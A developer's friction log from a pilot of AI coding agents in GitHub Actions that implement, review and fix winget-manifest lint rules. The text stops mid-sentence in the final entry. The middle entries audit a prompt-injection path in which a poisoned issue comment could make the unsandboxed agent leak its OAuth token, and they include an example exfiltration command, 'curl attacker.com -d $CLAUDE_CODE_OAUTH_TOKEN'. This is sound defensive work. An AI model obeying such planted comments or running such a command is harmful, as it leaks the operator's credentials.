# Friction log

Every time a human reaches into the loop, it gets written down here: what broke, what was
done about it. This file — not the linter — is the actual output of the pilot.

Newest last.

---

## 2026-07-22 — Setup

### Label naming was ambiguous because CVM uses `Sandcastle` for something else

**What happened.** The handoff left "is the trigger label `agent:implement` or CVM's
`Sandcastle` spelling?" as an open question, because both strings appear in
`mattpocock/course-video-manager`.

**What it actually is.** They are different things. Across all 7 CVM workflows and all 5
workflows in `mattpocock/sandcastle`, every *trigger* is `agent:*`. `Sandcastle` is CVM's
local spelling of the canonical **triage** label `ready-for-agent` — "fully specified, ready
for an AFK agent" — per `docs/agents/triage-labels.md`. It gates human intent; `agent:implement`
gates the workflow.

**Resolution.** Use `agent:*` for workflow state. We are not adopting a triage label yet —
with one workflow and a hand-written backlog there is no triage step to gate.

### CVM is a version behind upstream, and the two disagree on layout

**What happened.** The handoff points at CVM as the model, but CVM's lockfile pins
`@ai-hero/sandcastle@0.10.0` while npm and `mattpocock/sandcastle` are both on `0.12.0`.
They also disagree on where runner scripts live: CVM uses `.sandcastle/implement/`,
upstream uses `.sandcastle/agent-workflows/implement/`.

**Resolution.** When they disagree, upstream wins. Adopted `agent-workflows/` nesting so the
other workflows can be added later without a rename. Also adopted upstream's `ISSUE_CONTEXT`
promptArg — it reads the issue with `gh` in the *runner script* and passes the text in, so the
agent has no reason to shell out to `gh` itself. Given `noSandbox()` leaks the runner's
`GH_TOKEN` into the agent process, that is a genuine improvement to the boundary, not just tidiness.

### `rootDir` broke `npm run verify` before a single test existed

**What happened.** Put `rootDir: "src"` and `outDir` in the base `tsconfig.json`, which also
`include`s `tests/`. `tsc --noEmit` immediately failed with TS6059 — test files are not under
`rootDir`.

**Resolution.** Base config is for typechecking (no `rootDir`, includes `src`, `tests` and
`.sandcastle`); `tsconfig.build.json` adds `rootDir`/`outDir`/`declaration` and narrows to
`src`. Worth recording because Gotcha 3 in the handoff says `npm run verify` must be green
from commit one, and this is exactly the class of thing that silently isn't.

### Windows-native, not WSL

**What happened.** The handoff specified WSL-native work because `/mnt/c` is slow under Docker
and causes CRLF problems. Decision 2 removed Docker entirely, so only the CRLF half survives.

**Resolution.** Working in `C:\Repos\winget-manifest-lint`. `.gitattributes` with
`* text=auto eol=lf` landed in the very first commit, before any source file, with fixtures
and schemas marked `-text` so byte-comparison tests stay honest. Local Node is v24 while
upstream's template pins 22; pinned ours via `.nvmrc` so the runner, CI and the dev machine
cannot drift apart.

---

## 2026-07-22 — First local run: Sandcastle's shell escaping is POSIX-only

**What happened.** The very first attempt to run `implement.ts` locally on Windows died before
the agent did any work:

```
FAILED: claude-code exited with code 1:
There's an issue with the selected model ('claude-opus-4-8').
It may not exist or you may not have access to it.
```

**What it looked like.** A model-availability or entitlement problem — the obvious readings
being "the OAuth token lacks Opus 4.8" or "the model id is wrong". Both were wrong.

**What it actually was.** `@ai-hero/sandcastle@0.12.0`, `dist/index.js:2788`:

```js
var shellEscape = (s) => "'" + s.replace(/'/g, "'\\''") + "'";
```

POSIX single-quote escaping with no platform branch. `claudeCode`'s `buildPrintCommand`
interpolates `--model ${shellEscape(model)}` into a command string that is executed via the
platform shell. On Linux `sh` strips the quotes; on Windows `cmd.exe` does not treat `'` as a
quoting character, so Claude Code receives a model named **`'claude-opus-4-8'`** — quotes
included — and the API returns 404 `model_not_found`.

**How it was isolated.** Narrowing, in this order:

1. `claude --model claude-opus-4-8 -p ...` → works. So the model id is valid.
2. The exact Sandcastle command shape (`--print --verbose --output-format stream-json -p -`)
   → works. So the flag combination is fine.
3. Same command with `CLAUDE_CODE_OAUTH_TOKEN` exported → works. **So the token is fine, and
   Opus 4.8 is entitled.** This ruled out the two hypotheses that looked most likely.
4. Same command with the model passed as `"'claude-opus-4-8'"` → reproduces the error
   *byte for byte*, and the stream-json `init` event shows `"model":"'claude-opus-4-8'"`.

Step 4 is the proof. Steps 1–3 are the ones worth remembering: the error message pointed
confidently at the wrong subsystem, and two plausible theories had to be killed before the
real cause was even visible.

**Impact.** Windows-only, and it affects local prompt tuning *only*:

- **CI is unaffected.** GitHub runners are Linux, `sh` strips the quotes, same code path works.
- The bug is not Claude-specific. `pi`, `codex`, `opencode` and `copilot` all build commands
  through the same `shellEscape`, so every provider is affected on Windows.

**Resolution.** Abandoned local prompt tuning; going straight to CI. The upstream bug is
recorded here rather than filed for now.

**The lesson that generalises.** The handoff mandated WSL-native work and gave two reasons:
`/mnt/c` is slow under Docker, and CRLF. Decision 2 removed Docker, so only CRLF appeared to
survive — and CRLF was solved with `.gitattributes`. That reasoning was sound and still wrong,
because there was a *third* reason nobody had enumerated: the toolchain assumes a POSIX shell.
Dropping a constraint because its stated justifications no longer apply is not the same as
verifying the constraint is unnecessary.

Cost: about 30 minutes, all of it before a single line of agent-written code existed.

---

## 2026-07-22 — First agent run (issue #4): agent succeeded, workflow failed

**Outcome.** The agent did its job correctly on the first attempt. The workflow failed at the
step *after* the agent finished, on a repository setting.

### What the agent got right, unprompted

Issue #4 (`package-identifier-format`, a single-field rule) produced one commit:

- Created `src/rules/package-identifier-format.ts` and **registered it** in
  `src/rules/index.ts`. Registration was the predicted silent failure — a rule that exists but
  is never run fails no test — and it did not happen.
- Used `positionOf()` rather than hand-computed line numbers.
- Got the `exactOptionalPropertyTypes` conditional spread right.
- 8 new tests plus an invalid fixture directory. `npm run verify` green at 16/16.
- **Scoped itself correctly**: deferred absent-field handling to a future required-field rule,
  and cross-file agreement to the separate cross-file rule, citing `CONTEXT.md` in comments.

That last point is the most encouraging result of the run. The single largest risk in a
greenfield repo is the agent inventing a new architecture per issue; instead it read the
domain doc and stayed inside the seams. `CONTEXT.md` earned its cost here.

**The boundary held.** The only issue comment came from `github-actions` (the workflow's own
failure handler). The agent did not push, comment, or edit labels, despite `noSandbox()`
placing `GH_TOKEN` and a preinstalled `gh` within its reach. One run is not proof — this is
convention, not enforcement — but it is evidence.

**Label state machine worked exactly as designed**: `agent:implement` consumed on entry,
`agent:in-progress` held during, removed by the `always()` step, `agent:blocked` applied on
failure with a comment.

### The failure

```
pull request create failed: GraphQL: GitHub Actions is not permitted
to create or approve pull requests (createPullRequest)
```

Repository setting *"Allow GitHub Actions to create and approve pull requests"*, **off by
default**. Not a code defect. Nothing in the handoff or in CVM's or upstream's workflows
mentions it, because both of those repos had it enabled long ago and the requirement is
invisible once satisfied.

**This is the shape of problem CI-first has and the local loop does not.** It is not
reproducible locally at any cost, because it is not in the code.

### Two distinct GITHUB_TOKEN limitations, now both observed

1. **Cannot create pull requests** — the failure above.
2. **Its pushes do not trigger workflows** — so `ci.yml` never ran on the agent's branch and
   verification had to be done by hand in a local worktree.

These are separate mechanisms with a single fix. The repo setting addresses only (1); an
`AGENT_PAT` addresses both. Chose the PAT.

### Secondary finding — failure messages are only as good as their source

The issue comment read *"(no reason file written; check workflow logs)"*. Correct behaviour:
`failure_reason.txt` is written by `implement.ts`, so it only ever explains **agent** failures.
A **workflow-step** failure falls back to the generic string. Worth improving once a few more
have been seen, rather than guessing now at what the message should say.

---

## 2026-07-22 — Second run: the PAT was set but the PR step never used it

**What happened.** Created `AGENT_PAT`, re-labelled #4, and the run failed at `Open draft PR`
with the *exact same* error as run one:

```
GitHub Actions is not permitted to create or approve pull requests
```

**Why the PAT didn't help.** A workflow bug of mine, not a GitHub setting. The `gh` CLI reads
its credential from `GH_TOKEN` in the environment. The workflow sets `GH_TOKEN` **once, at job
level**, to `secrets.GITHUB_TOKEN`. The PAT was only wired into two places:

- the `Checkout main` step's `token:` input — which is why `git push` worked; and
- nowhere near `gh pr create`.

So the branch pushed as the PAT (user identity) while the PR creation still ran as the Actions
bot — and the Actions bot is precisely what the org setting forbids from creating PRs. The
push succeeding *masked* the misconfiguration: it looked like the PAT was in effect.

**The subtlety worth keeping.** "Set the AGENT_PAT secret" is necessary but not sufficient.
A secret does nothing until a step's `GH_TOKEN` actually points at it. Job-level `GH_TOKEN`
plus a per-step `token:` override is a trap: `git` operations honour the override, `gh`
operations silently keep using the job-level value.

**Fix.** Override `GH_TOKEN` on the `Open draft PR` step to
`${{ secrets.AGENT_PAT || secrets.GITHUB_TOKEN }}`. Left the label/comment steps on the
job-level `GITHUB_TOKEN` — those work fine as the Actions bot and there is no reason to widen
the PAT's use beyond the one operation that requires it.

**Still unproven after this fix.** Whether `ci.yml` triggers on the resulting PR. The theory
is yes — the branch and the PR now both carry the PAT's user identity, and user-authored pushes
do trigger workflows — but run one never got far enough to test it and run two failed at the
same gate. Third run is the first real test of the full path.

---

## 2026-07-22 — Third run: the loop closed

**Outcome.** Full path, green. This is the run the pilot was built to produce.

| Step | Result |
|---|---|
| Agent implements #4 | rule written, registered, 8 tests |
| Push branch | via PAT |
| Open draft PR | **PR #27**, authored by the human user (PAT identity, `is_bot: false`) |
| CI cascades onto the PR | `verify` passed in 10s, unattended |
| Labels settle | #4 returned to no agent labels |

**The thing that had never worked, worked.** `ci.yml` triggered on the agent's PR by itself,
because the branch and PR now carry a user identity rather than the Actions bot's, and
user-authored pushes trigger workflows. Hand-verification in a local worktree is no longer
needed. This is the concrete payoff of the PAT, distinct from "PRs can now be created" — it is
the *second* GITHUB_TOKEN limitation from the first-run entry, also resolved.

**Cost to get here:** three runs. Run 1 exposed the create-PR org restriction. Run 2 exposed
my own miswiring of the PAT. Run 3 closed it. None of the three failures were in the agent's
code — the agent got the rule right on run 1 and every run since. Every failure was in the
plumbing around it. That is the expected shape: the workflow is the hard part, the linter is
the easy part, and this whole exercise exists to debug the former.

**Observation, not yet friction — Node 20 deprecation warning.** Every run annotates:

> Node.js 20 is deprecated. actions/checkout@v4 and actions/setup-node@v4 are being forced to
> run on Node.js 24.

Harmless today (they run on 24 regardless), but `@v4` will eventually stop being patched.
Bumping to `@v5` when convenient removes the noise. Logged so it is a decision, not a surprise.

---

## 2026-07-23 — Fourth run (issue #5): the loop is boring

**Outcome.** Labelled #5, walked away, came back to a green PR. **No intervention between runs
— the first time that has been true.** This is the milestone that matters more than run three:
run three proved the mechanism *can* complete once; this proves it repeats with zero plumbing
changes, which is the bar the handoff set ("live with it until it's boring") before trusting
harder rule classes.

- `package-version-path-safe` (another class-1 single-field rule).
- PR #29, draft, authored by the user; `ci.yml` cascaded and passed in 10s.
- **The agent appended to the registry** — `[packageIdentifierFormat, packageVersionPathSafe]`
  — rather than overwriting it. It read the current state of `index.ts` and extended it. The
  registry-registration step, predicted as the most likely silent failure, has now been done
  correctly on two independent rules against two different base states.

**Tally so far:** two rules on `main`, one in review (#29), all class-1. Four implement runs;
the only failures were the two plumbing bugs (create-PR restriction, PAT miswiring), both in
the first two runs, both fixed. The agent's code has been correct every single run.

**What this unlocks.** Class 1 is demonstrably boring. The next informative run is a class-2
(cross-field, e.g. #13 duplicate-tuple) or class-3 (cross-file, e.g. #18 agreement) rule —
where `maxIterations: 1`, the prompt, and `CONTEXT.md`'s model actually get stress-tested. A
green class-1 run tells us little new; a class-3 run is where the next real friction lives.

---

## 2026-07-23 — Fifth run (issue #18): first cross-file rule, and CONTEXT.md paid off

**Outcome.** Green, no intervention, PR #31 — but the result worth recording is *how* the agent
scoped the rule, not that CI passed. This was the first class-3 (cross-file) rule, chosen
specifically to stress the domain model. The model held.

`PackageVersion` appears in all three manifest files. A naive implementation checks all three
against the directory name and emits three diagnostics for one logical problem. The agent
instead:

- Checked **only the version manifest** (the index file), via the `versionFile()` accessor and
  the parser's `directoryVersion`.
- **Explicitly deferred** the "installer and locale files carry the same `PackageVersion`"
  check to a separate cross-file rule — which is exactly issue #17 (`cross-file-fields-agree`),
  a sibling it could not see. It reasoned about a rule-boundary it had no direct knowledge of,
  purely from the rule-class model in `CONTEXT.md`.
- Documented that boundary in a comment, so the next agent working #17 inherits the seam.

That coordination-to-avoid-double-reporting is a genuine design judgment, and it is precisely
what `CONTEXT.md`'s "three rule classes" section was written to produce. The single largest
greenfield risk — the agent inventing a fresh architecture or triple-reporting because it
lacked the whole-system view — did not materialise. The domain doc earned its cost here more
clearly than on any single-field rule.

**Ramp status.** Class 1 (two rules) and now class 3 (one rule) both land clean with
`maxIterations: 1`. Class 2 (cross-field-within-a-file, e.g. #12 duplicate-tuple) is the one
remaining untested shape. On current evidence the ramp holds and the prompt does not yet need
the harder rule classes spelled out inline.

---

## 2026-07-23 — Sixth run (issue #12): class 2 lands, ramp complete

**Outcome.** Green, no intervention, PR #33. This was the last untested rule class
(cross-field-within-a-file), and the hardest reasoning yet. The agent got every subtlety the
issue and `CONTEXT.md` called out:

- **File-level default fallback.** `InstallerType`/`Scope` may be declared once at the root and
  overridden per installer. The agent resolved each entry's effective value
  (`record["InstallerType"] ?? rootType`) *before* comparing — the exact trap a naive
  implementation falls into by reading per-installer fields only.
- **Architecture is always per-installer** — no fallback, noted in a comment.
- **Absent scope is itself a value.** Two installers that both omit `Scope` collide; the agent
  reasoned this explicitly and its `JSON.stringify` key makes it hold.
- **Reports the second occurrence, not the first** — via a `seen` set.
- The fixture demonstrates the collision (two `x64`/`machine` entries with an `x86` between).

**Minor deviation, not a defect.** The agent named the rule
`installer-architecture-type-scope-unique`, not the issue's suggested `installer-tuple-unique`.
The issues only ever *suggested* ids, and the chosen name is arguably clearer. Flagged in case a
future issue references an exact id — none currently does.

**Ramp complete.** All three rule classes now land clean under `maxIterations: 1`:

| Class | Issue | |
|---|---|---|
| 1 — single-field | #4, #5 | clean |
| 2 — cross-field in a file | #12 | clean, fallback resolved correctly |
| 3 — cross-file | #18 | clean, sibling-rule scoping correct |

**Tally: six implement runs, agent code correct on all six.** Every failure in the whole pilot
was plumbing (runs 1–2: create-PR restriction, PAT miswiring), never the agent. The loop is
boring in the sense the handoff meant it: the interesting question is no longer "does it work"
but "what do we point it at". The remaining backlog is mechanical; the next *design* work is
`agent-review.yml` (+ the shared-helper extraction scoped earlier) and the winget-pkgs corpus
job (#22), which is the first time a rule meets a real manifest rather than a hand-built fixture.

---

## 2026-07-23 — The corpus found real bugs, and the loop fixed them

This is the most important entry in the log. The corpus job caught genuine rule bugs, and the
same agent loop repaired them, validated against 4,000 real manifests. Find → fix → validate,
end to end.

### The catch: 417 false positives, from specs *I* wrote

First corpus run (4,000 of 155,150 version directories, a 2.6% sample) emitted **417
diagnostics** — every one a false positive by definition, since Microsoft accepted every
manifest in the corpus. Two rules, both wrong:

| Rule | Count | The bug |
|---|---|---|
| `installer-architecture-type-scope-unique` | 405 | uniqueness key omitted `InstallerLocale` |
| `package-identifier-format` | 12 | capped identifiers at 4 segments; winget allows 8 |

**Neither was an agent error.** The agent implemented issues #4 and #12 faithfully and
correctly. The bugs were in the *issue specs*, which encoded my imperfect understanding of the
winget rules. This is exactly the failure mode the corpus exists to catch and that nothing
upstream of it can: the agent cannot know the spec is wrong, and hand-built fixtures only test
the behaviour you already thought of. Only real known-good data is an independent oracle.

### The lesson that changed how the fixes were written

Having just watched two of my own specs turn out wrong, I did not write the correction specs
from memory. I pulled ground truth first:

- PackageIdentifier segment count — from the actual schema in `microsoft/winget-cli`
  (`manifest.version.1.6.0.json`): pattern `{1,32}(\.{1,32}){1,7}` → 2–8 segments, each 1–32
  chars, ≤128 total.
- Installer uniqueness key — from winget-cli's validation source
  (`ManifestValidation.cpp`): *"{installerType, arch, language and scope} combination is the
  key."* Plus two subtleties in the comparator: archive types also key on `NestedInstallerType`,
  and an unspecified scope is a wildcard, not a concrete value.

Both corrected issues (#36, #37) cited these sources inline, so the agent implemented against
ground truth rather than my guess. **Dropping a spec into the loop without grounding it is how
the false positives got there in the first place; the fix was to ground the correction.**

### How the agent did on the fixes

- **#36 (identifier, #38):** got the segment-count fix right and even recognised that an old
  failing test (`A.B.C.D.E`, 5 segments) was now *valid* and replaced it with a 9-segment case.
  But it **skipped the secondary ask** — the per-segment 1–32 char bound. A clean example of an
  issue with a primary fix plus a bundled extra getting the extra dropped. Hand-completed in #39
  (the check subsumes the empty-segment case). Cheap to finish by hand; not worth a second run.
- **#37 (installer, #40):** the strongest agent output of the pilot. It added `InstallerLocale`
  with root fallback, folded `NestedInstallerType` in for archives, implemented the
  scope-wildcard rule — and, unprompted, recognised that a wildcard *breaks hashset equality*
  (matching is non-transitive), so it replaced the `Set<string>` key with a pairwise `collides()`
  predicate. It also turned the real false-positive manifest (`abgox.InputTip`, a gitee zh-CN
  mirror) into a *valid* regression fixture. That algorithmic insight was not in the issue.

### The validation

Re-ran the corpus against the same pinned SHA — identical 4,000 directories, only the rules
changed. **417 → 0. Clean.** The corpus job is now on `main` as a standing gate: PRs touching
`src/**` re-run it, so a future rule regression that a fixture misses still gets caught.

### What the whole episode proves

The pilot's earlier runs proved an agent can *implement* rules. This proves the thing that
actually matters for correctness: an agent implements the spec it is given, so **the spec — and
the oracle that checks it — are where correctness lives.** The corpus is that oracle, and the
loop that writes rules is the same loop that fixes them once the oracle points at the problem.

---

## 2026-07-23 — Independent review of the review workflow caught a real injection path

Building `agent-review.yml` (review-lite, the second workflow) introduced the first genuine
security surface: `pull_request_target`. On a public repo that trigger runs with secrets and
write access, so it is the classic fork-code-execution footgun. Before merging, an independent
reviewer (fresh context, told to be adversarial) went over it.

**The fork guard was correct.** The job-level
`if: … && github.event.pull_request.head.repo.full_name == github.repository` fails closed: a
fork PR skips the entire job before a runner is provisioned, so no checkout, no `npm ci`, no
secret exposure. Label-adding also requires triage/write permission, so a random user cannot
even trigger it. That part held up.

**But the same-repo guard closed only one of two doors.** The reviewer found a second
exfiltration path the fork guard does not touch:

- `review-context.ts` fetched the linked issue with `gh issue view N --comments`. **Issue
  comments on a public repo are world-writable — anyone can post one.**
- That text flowed verbatim into the agent prompt. The agent runs unsandboxed (`noSandbox`) with
  `CLAUDE_CODE_OAUTH_TOKEN` in its environment, and its output is posted as a **public** review.
- So a poisoned issue comment could instruct the agent to write the token into the review body —
  no network egress or fork required. Gated only by a collaborator labelling a PR that links to
  the poisoned issue.

**The fix, and why it is sufficient.** Dropped `--comments`; the agent now sees only the issue
**title and body**. Comments were the *only* world-writable input in the chain — the issue
body, the PR diff, and the PR body all require repo write access to author (we create the
issues; same-repo branches need write access; fork PRs are already blocked). So the change moves
review's injection surface behind the exact same write-access trust boundary the implement
workflow already assumes. Review is now no more exposed than implement; the residual
(`CLAUDE_CODE_OAUTH_TOKEN` in an unsandboxed agent) is identical to implement's and equally gated.

**Also fixed, from the same review:**

- The diff used `git diff main...HEAD || git diff main..HEAD`. The two-dot fallback has different
  semantics and would silently mis-filter inline comments on a no-change PR. Dropped it — the
  three-dot diff, empty string and all, is the correct and only form.
- The workflow's `git fetch origin main:main || git fetch origin main` fallback would populate
  `FETCH_HEAD` but create no local `main` ref, breaking the diff. Replaced with an explicit
  refspec.

**The lesson.** The author (me) checked the fork guard carefully and it was right — but was
blind to the injection path precisely because it is *not* the famous `pull_request_target` hole.
A fresh adversarial reviewer with no attachment to the design found it in one pass. For anything
carrying secrets on a public repo, an independent review is worth its cost. A possible future
hardening — **now implemented; see "Prompt-injection audit" below** — drops `GH_TOKEN` from the
agent's environment so an injected agent cannot use `gh` even if the input were
trusted-but-hostile.

> **Follow-up correction (same day).** Reviewing *this* fix showed the "comments were the *only*
> world-writable input" claim is not quite right: on a public repo anyone can *open* an issue, so
> issue title/body are only write-gated while we author every issue. The two entries below tighten
> the fix from "drop comments" to "gate on author association", and note that `implement.ts` had
> the identical `--comments` vector, live in production.

---

## 2026-07-23 — Prompt-injection audit, layer 2: author association, not field type

Reviewing the Layer-1 fix (drop `--comments`) opened two more doors.

**1. "Title and body need write access" is an assumption, not a structural fact.** On a public
repo **anyone can open an issue** with arbitrary title and body — write access is needed to
*edit* an issue, not to *create* one. The Layer-1 conclusion held only because we author every
issue today. It breaks the instant a maintainer labels a **community-authored** issue
`agent:implement` — a normal triage action — because that issue's attacker-controlled body then
flows into the review prompt. The bug did not close; it moved from comments to body.

The fix generalises from *field* to *author*: `fetchTrustedIssue` returns the title/body only
when the issue author's association is `OWNER`/`MEMBER`/`COLLABORATOR`, and never fetches
comments. The injection boundary is now structural, and survives community issues entering the
backlog.

**2. `implement.ts` had the same `--comments` call — live in production.** Unlike review's
*latent* issue-body risk, this one was active: anyone can comment on an issue already labelled
`agent:implement`, and every implement run fed those comments to the agent. Now on the same
author-gated fetch. Finding it is the payoff of auditing the *shared* surface rather than just
the file that prompted the review.

**Token scrub, both runners.** `scrubGitHubTokens()` now removes `GH_TOKEN`/`GITHUB_TOKEN` from
the agent's environment after context is fetched and before the agent starts. The agent has no
legitimate use for the GitHub token — context is already read, and pushing/labelling/commenting
happen in separate workflow steps. This partly converts the convention-only "do not push / label
/ comment" boundary into a technical control: the agent can no longer drive `gh`. Honest limits —
it is process-scoped (later workflow steps, including implement's own push, are unaffected), and
it does not remove the git credential `actions/checkout` persists; blocking `git push` is a
separate control (`contents: read` on review).

The compounding lesson: the boundary is never "which field" — it is "who can write this input,"
and the answer terminates at author association. Each fix, reviewed, revealed the next door.

**Refinement (same day): don't throw out the baby.** "Drop all comments" was blunter than
security requires — it also discarded *maintainer* steering, which is the base repo's whole
iteration model. Restored precisely: `fetchTrustedComments` reads issue/PR conversation comments
but keeps only collaborator-authored ones (same `authorAssociation` gate). A maintainer can steer
the agent with a comment again; a drive-by comment is still dropped. Deliberately *not* restored:
inline review-thread comments (that's the full workflow) and pagination (first ~30 is plenty —
adding page-walking would be complexity for no security or real usability gain). One open
decision this surfaces for the multi-agent future: agents post as `github-actions[bot]`, which is
not a collaborator, so an agent-to-agent handoff *through comments* would need the trusted set to
explicitly include our own agent identity (or post under `AGENT_PAT`). Moot today — nothing reads
agent comments yet — but it's the "define the agent trust identity" decision, now written down.

## 2026-07-23 — The irreducible residual: noSandbox, egress, and exfiltration

After author-gating every text input, here is what remains and what closing it would cost.

**Remaining injection *source*: the diff and repo contents.** Irreducible — a review agent must
read the code under review, and code carries comments and strings. For same-repo (guarded) PRs
this is write-gated, reducing to "trust your collaborators and your dependencies." A poisoned
transitive dependency is the source that write-gating the PR does not cover.

**Remaining exfil *channels*, all downstream of `noSandbox()` (Decision 2):** full network egress
(`curl attacker.com -d $CLAUDE_CODE_OAUTH_TOKEN` — no public channel or repo write needed); the
model token in the agent's readable environment (it must be there to run); and the public review
summary the agent authors.

**Cheaply fixable, and done:** author-gating, `GH_TOKEN` scrub, `contents: read` on review, and
token scope/rotation/short TTL (`GITHUB_TOKEN` is already ephemeral — never substitute a
long-lived `AGENT_PAT` where it suffices).

**Not cheaply fixable:** network egress + a live model token the agent can read. That containment
is exactly what a sandbox provides and exactly what Decision 2 traded away for environment-parity
with CI (which killed the `yq`-drift bug class). The tension is real — **environment-parity XOR
cheap exfil-containment**, not both — without re-introducing a sandbox that mirrors CI *and*
restricts egress. GitHub-hosted runners offer no egress filtering, so that means self-hosted
runners or a containment layer.

**Accepted posture.** With all injection sources behind the write boundary, the residual is "a
compromised collaborator or a poisoned dependency could exfiltrate a scoped, rotatable model
token." Standard, bounded, monitorable — the same trust surface as letting collaborators run CI.
Reach for sandbox-plus-egress-control only if the threat model includes untrusted code or
high-value long-lived secrets.

**Benchmark — CVM does less (clone 2026-07-21).** No fork guard (only the label check, relying on
label-adding requiring write/triage); no author-association filtering (it feeds `--comments` and
all unresolved review threads to the agent); `contents: write` (its full review self-commits and
pushes). Its whole mitigation is "ephemeral runner + write-to-label + trust collaborators." And
GitHub's "require approval for fork workflow runs" does **not** cover `pull_request_target`, so
that label gate is load-bearing for him. Copying CVM verbatim — the original plan — would have
inherited both the fork path and the injection surface. We are now stricter than the model repo,
with the residual written down.

**Hard prerequisite for the full build-out.** Full CVM-style review replies to human PR review
threads, which *requires* reading world-writable comments — reintroducing the injection source by
design. Upstream's `review-context.ts` does not author-filter threads. The full version MUST apply
the same author-association gate to review-thread comments, and its self-improvement commits add
`contents: write` + push. Prerequisite, not nicety.

---

## 2026-07-23 — First review run: the review agent predicted a corpus failure, and was right

`agent-review.yml` ran for the first time against PR #43 (issue #16, the ReleaseDate warn rule).
Everything worked mechanically — label transition, structured-output extraction, diff-line
filtering, review posted, labels cleaned up. But the *content* is the result worth recording.

**The review made two inline comments and one falsifiable prediction.**

Comment 1 noticed something no fixture could: this was the ruleset's first *heuristic warning* —
every prior rule flags a hard schema violation — and it went and read `scripts/lint-corpus.ts`,
saw the gate was `findings.length === 0`, and reasoned that warnings therefore count as corpus
failures. It predicted the corpus job would go red on legitimately-old software, and asked for
confirmation before merge.

**The corpus then went red with exactly that failure**: 4 warnings, all pre-2015 dates on real
Microsoft-accepted packages — `Microsoft.XNARedist` (2011-09-01) being the clincher, since that
is Microsoft's own package with a genuinely 2011 release date.

Two independent mechanisms cross-validated each other. The review reasoned from source it was not
pointed at; the corpus confirmed it from real data. Either alone is useful; together they caught
the problem before merge and explained *why* it happened.

Comment 2 was a factual catch: the rule justified its 2015 bound with "winget did not exist
before this." winget launched in **2020**, and `ReleaseDate` is the *software's* release date,
which legitimately predates any package manager. Partly wrong, though — it claimed the same
wording appeared in `CONTEXT.md`, and it did not. Scoring honestly: one comment fully correct,
one correct in substance with an incorrect supporting detail. Both were worth having.

**Two fixes, and the second matters more than the first.**

1. *The rule:* dropped the lower bound entirely. Any "implausibly old" cutoff is arbitrary and the
   corpus proves legitimately old software exists; we now flag only what is unambiguously wrong —
   a date that has not happened yet. The old-date fixture moved from `invalid/` to `valid/` and
   became a regression test.
2. *The harness (mine):* `lint-corpus.ts` failed on `findings.length === 0`, counting **warnings**
   as failures. The oracle's premise is "Microsoft accepted it → it is valid → any **error** is a
   false positive." A warning makes no claim of invalidity. So as written, **the corpus gate made
   warning-severity rules structurally impossible** — the first one ever written failed CI
   immediately. Now: errors fail the build; warnings are counted and printed so a rule that goes
   haywire is still visible, but do not fail it.

That second one is the deeper lesson. The corpus caught a bug in a *rule* last time; this time it
caught a bug in **the oracle itself** — an assumption ("every diagnostic is a correctness claim")
baked in when every rule happened to be an error. A gate is only as good as the premise encoded
in its exit condition, and that premise silently expired the moment a new severity appeared.

**Also validated in the same run:** the hardened `implement.ts` executed correctly in CI (no
"withheld" in the log, so `fetchTrustedIssue`/`fetchTrustedComments`/`scrubGitHubTokens` all work
against the real API), and the agent avoided the purity trap the issue set — it introduced
`RuleContext { now }` and threaded it from `lintDirectory` rather than reading the clock.

## 2026-07-23 — The review→fix handoff is blocked on agent identity

Looked up how CVM closes the loop, since ours currently stops at "review posted".

**CVM overloads one label across two workflows, disambiguated by event type:** `agent:implement`
on an *issue* triggers `agent-implement.yml`; the same label on a *PR* triggers
`agent-implement-pr.yml`, which reads unresolved review threads, review summaries, and top-level
PR comments, then fixes the branch. It refuses with a comment if all three are empty, so a no-op
run cannot burn CI.

**The asymmetry is deliberate.** implement→review cascades automatically (implement adds
`agent:review` using `AGENT_PAT` so the event fires). review→fix does **not** — `agent-review.yml`
just clears its labels and stops. A human decides whether the feedback is worth acting on. That is
the brake that stops two agents ping-ponging a PR, and it is worth keeping.

**What blocks us, confirmed empirically.** Our review posts as `github-actions[bot]` with
`author_association = NONE`:

```
user=github-actions[bot]  type=Bot  assoc=NONE
```

So our own author-association gate would drop our own review's feedback, and a CVM-style
`implement-pr` would refuse the run as "nothing to act on". The "define the agent trust identity"
decision, logged earlier as hypothetical, is now the concrete blocker.

Two resolutions when we build it: (a) trust `github-actions[bot]` explicitly — defensible because
that identity is only obtainable by workflows *in* the repo, and adding a workflow requires write
access, so it is transitively write-gated; or (b) post reviews under `AGENT_PAT` so the author is
the owner. (a) keeps honest bot attribution and is the smaller change.

Note this must be paired with author-gating the *other* two feedback sources. Top-level PR
comments and review summaries are genuinely world-writable on a public repo, and `implement-pr`
runs with `contents: write` and pushes — so an injection there steers **committed code**, not just
review text. That makes it the highest-risk workflow in the set, and the author gate a hard
prerequisite rather than a nicety.

---

## 2026-07-23 — Closing the loop: `agent:fix`, and what consolidation caught

Built `agent-implement-pr.yml` (trigger label **`agent:fix`**), completing implement → review →
fix. Three things from the build are worth keeping.

**1. A distinct label instead of CVM's overload.** CVM triggers both its issue-implement and its
PR-fix workflows with `agent:implement`, disambiguated only by event type. Copying that here
would have been a footgun: our `agent-implement.yml` listens on `issues:` only, so labelling a
*PR* `agent:implement` would silently do nothing at all. `agent:fix` makes the two intents
distinct at a glance.

**2. Consolidation was the right call and it found a latent bug.** Review and fix both needed PR
feedback, so the three REST calls became one GraphQL query shared by both. That was not just
tidying — **REST does not expose `isResolved` at all**, so the consolidated query is what made
"skip resolved threads" possible. Resolving a thread now means what a human expects: handled,
stop re-raising it.

While testing that query, the author login came back as `github-actions` — but the trusted-bot
set contained only `github-actions[bot]`, the **REST** spelling. GraphQL spells the same account
differently. Left unfixed, review would have silently discarded its own agent's comments and the
review→fix handoff would have quietly done nothing. Found by smoke-testing the real query against
PR #43 before shipping, not by reading the code. Both spellings are now listed.

**3. Two gaps found by asking a plain question.** "Will it read comments and replies I add?"
turned out to have an asymmetric answer: `agent:fix` read all four PR comment surfaces, but
`agent:review` read only conversation comments — so a re-review was blind to inline notes left on
the previous one and would repeat itself. Both now use the shared fetch. The question was worth
more than the code review that preceded it.

Also added `docs/parity.md`: every CVM feature tracked side by side, with deliberate omissions
(❌) distinguished from not-yet-done (📋). The point is that a gap should be a visible decision,
not an accident discovered later.

---

## 2026-07-23 — The full cycle runs: implement → review → fix, no human in the middle

Issue #13 (`nested-installer-compatibility`, class 2) travelled all three workflows in sequence
with no intervention at any stage. `agent:fix` had never run before.

| Stage | Result |
|---|---|
| `agent:implement` | PR #46 — rule, three-file fixture, tests |
| `agent:review` | flagged helper duplication with a silent-drift risk |
| `agent:fix` | hoisted the shared helpers into `manifest.ts` |

**The review found something no test could.** Both rules were individually correct, so no fixture
and no corpus run would ever have flagged them. What it spotted was that `ARCHIVE_TYPES` — the set
